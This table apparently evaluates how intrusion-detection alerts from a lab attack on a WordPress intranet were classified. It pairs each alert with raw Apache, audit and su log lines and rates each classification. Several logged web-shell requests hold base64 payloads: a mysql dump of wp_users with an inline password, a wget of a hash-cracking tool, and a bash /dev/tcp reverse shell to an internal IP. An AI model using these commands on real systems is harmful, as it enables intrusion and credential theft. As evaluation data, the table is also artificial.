AT;#;Classification;Attack Line Content;Description;Correct Attack Type?
WPScan;3;"Web Application Scanning,
Vulnerability Scanning";"IDS: “New request method in Apache Access log.”, “New value(s) detected”
Raw Data: “HEAD /wp-content/themes/ecobiz/thumb/timthumb.php HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”";Classification probably based on tool name WPScan and attempted access to theme directory;Correct & expressive
WPScan;2;Web Application Scanning;"IDS: “New request method in Apache Access log.”, “New value(s) detected”
Raw Data: “HEAD /wp-content/themes/eCobiz/timthumb.php HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”";Classification probably based on tool name WPScan and attempted access to theme directory;Correct & expressive
Dirb;2;"Credential Access,
Reconnaissance";"IDS: “New status code in Apache Access log.”, “New value(s) detected”
Raw Data: “GET /javascript/jquery/.htpasswd HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to credentials file and http status code 403;Alternate explanation for alert
Dirb;6;Web Application Scanning;"IDS: “New characters in Apache Access request.”, “New character(s) detected”
Raw Data: “GET /javascript/jquery/@ HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and http status code 404;Correct & expressive
Dirb;3;"Discovery,
Initial Access";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/info.php' not found or unable to stat”";Classification probably based on attempted access to info.php ;Too generic
Dirb;1;"Directory Traversal,
Web Application Scanning";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “AH01276: Cannot serve directory /var/www/intranet.price.fox.org/wp-includes/js/thickbox/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive”";Classification probably based on attempted access to directory without a default index file;Correct & expressive
Dirb;1;Access Control Evasion;"IDS: “New event type”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-includes/js/thickbox/.hta”";Classification probably based on attempted access to hidden file indicating scanning;Alternate explanation for alert
Dirb;4;Web Application Scanning;"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on http status code 301 ;Correct & expressive
Dirb;1;"Application Discovery,
Information Disclosure";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/js/tinymce/phpinfo.php' not found or unable to stat”";Classification probably based on attempted access to phpinfo.php which might include environment information;Correct & expressive
Dirb;1;"Application Discovery,
Initial Access";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/index.php' not found or unable to stat”";Classification probably based on attempted access to non-existent php file in theme directory;Correct & expressive
Dirb;1;Web Application Reconnaissance;"IDS: “New characters in Apache Access request.”, “New character(s) detected” 
Raw Data: “GET /wp-content/themes/go/includes/classes/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and http status code 404;Too generic
Dirb;1;File / Directory Enumeration;"IDS: “New event type.”, “New path(es) detected”
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/info.php' not found or unable to stat”";Classification probably based on attempted access to non-existent php file in theme directory;Correct & expressive
Dirb;1;"Web Application Reconnaissance,
Environment Discovery";"IDS: “New event type”, “New path(es) detected”
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/phpinfo.php' not found or unable to stat”";Classification probably based on attempted access to phpinfo.php which might include environment information;Correct & expressive
Dirb;1;Access Attempt to Restricted Resource;"IDS: “New status code in Apache Access log.”, “New value(s) detected”
Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempt to access plugin folder and http status code 403;Alternate explanation for alert
Dirb;5;File / Directory Enumeration;"IDS: “New characters in Apache Access request.”, “New character(s) detected”
Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and http status code 404;Correct & expressive
Dirb;1;Web Application Reconnaissance;"IDS: “New event type.”, “New path(es) detected”
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/info.php' not found or unable to stat”";Classification probably based on attempted access to sensitive .php file;Too generic
Dirb;2;Reconnaissance;"IDS: “New characters in Apache Access request.”, “New character(s) detected”
Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and http status code 404;Too generic
Dirb;1;"Reconnaissance, 
Credential Access";"IDS: “New status code in Apache Access log.”, “New value(s) detected”
Raw Data: “GET /wp-content/themes/go/dist/images/social/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to wp themes and http status code 403;Alternate explanation for alert
Dirb;1;"Reconnaissance,
Defense Evasion";"IDS: “New status code in Apache Access log.”, “New value(s) detected”
Raw Data: “GET /wp-content/themes/go/dist/images/social/.hta HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to hidden file in wp themes folder;Too generic
Dirb;2;Credential Access;"IDS: “New status code in Apache Access log.”, “New value(s) detected”
Raw Data: “GET /wp-content/themes/go/dist/js/admin/.htpasswd HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempt to access hidden credentials file in wp themes folder;Alternate explanation for alert
Dirb;2;"Reconnaissance, 
Initial Access";"IDS: “New characters in Apache Access request.”, “New character(s) detected”
Raw Data: “GET /wp-content/themes/go/dist/js/admin/~adm HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters and http status code 404;Too generic
Dirb;1;"Defense Evasion,
Credential Access";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess”";Classification probably based on attempted access to hidden file in wp themes folder;Alternate explanation for alert
Dirb;3;Information Disclosure Attempt;"IDS: “New event type.”, “New path(es) detected”
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess_”";Classification probably based on attempted access to hidden credentials file in wp themes folder;Alternate explanation for alert
Dirb;2;File / Directory Enumeration;"IDS: “New event type.”, “New path(es) detected”
Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/admin.php' not found or unable to stat”";Classification probably based on attempted access to sensitive .php file;Correct & expressive
Web Shell;1;"Web Shell Upload, 
Command and Control (C2)";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 200 507795 - python-requests/2.27.1”";Classification probably based on high entropy because of base64 encoded payload;Correct & expressive
Web Shell;1;"Data Exfiltration, 
Common and Control (C2)";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 200 506717 - python-requests/2.27.1”";Classification probably based on high entropy because of base64 encoded payload;Alternate explanation for alert
Password Cracking;1;"Web Shell Activity, 
Command and Control (C2)";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 200 506876 - python-requests/2.27.1”";"Classification probably based on high entropy because of base64 encoded payload; payload however was not decoded to identify indicators of password cracking attack";Alternate explanation for alert
Password Cracking;1;Automated Access / Account Enumeration;"IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”
Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”";Classification probably based on unusual frequency of apache access requests with headless browser;Correct & expressive
Password Cracking;1;"Resource Hijacking, 
Denial of Service";IDS: “CPU value deviates from average in monitoring logs.”, “Statistical data report”;Classification probably based on unusual CPU usage increase;Alternate explanation for alert
Password Cracking;1;Command and Control;"IDS: “Unusual occurrence frequencies of DNS query IPs.”, “Frequency anomaly detected”
Raw Data: “dnsmasq[14460]: query[A] mmx-ds.cdn.whatsapp.net from [IP]”";Classification probably based on unusual frequency of DNS queries;Alternate explanation for alert
Reverse Shell;1;"Initial Access, 
Web Shell";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1 200 506717 - python-requests/2.27.1”";Classification probably based on high entropy because of base64 encoded payload;Correct & expressive
Privilege Escalation;2;Privilege Escalation;"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “intranet-server su[28816]: Successful su for phopkins by www-data”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;"Privilege Escalation,
Persistence";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;3;Credential Access;"IDS: “New user_auth parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Alternate explanation for alert
Privilege Escalation;1;"Persistence, 
Privilege Escalation";"IDS: “New user_start parameter combination in Audit logs.”, “New value combination(s) detected”
Raw Data: “type=USER_START msg=audit(1642511672.403:2449): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”";Classification probably based on tool name su;Correct & expressive
;93;;;;
